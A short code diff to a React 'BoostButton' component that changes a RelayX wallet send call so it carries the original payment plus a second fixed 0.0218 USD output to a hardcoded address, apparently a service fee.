@@ -57,7 +57,13 @@ const BoostButton = ({ txid, content, difficulty }) => {
 
       console.log('relayx.send.params', send);
 
-      const result = await relayone.send(send);
+      const result = await relayone.send({
+        outputs: [send, {
+          currency: 'USD',
+          amount: 0.0218,
+          to: '1MqPZFc31jUetZ5hxVtG4tijJSugAcSZCQ'
+        }]
+      });
 
       console.log('relayx.send.result', result);
 
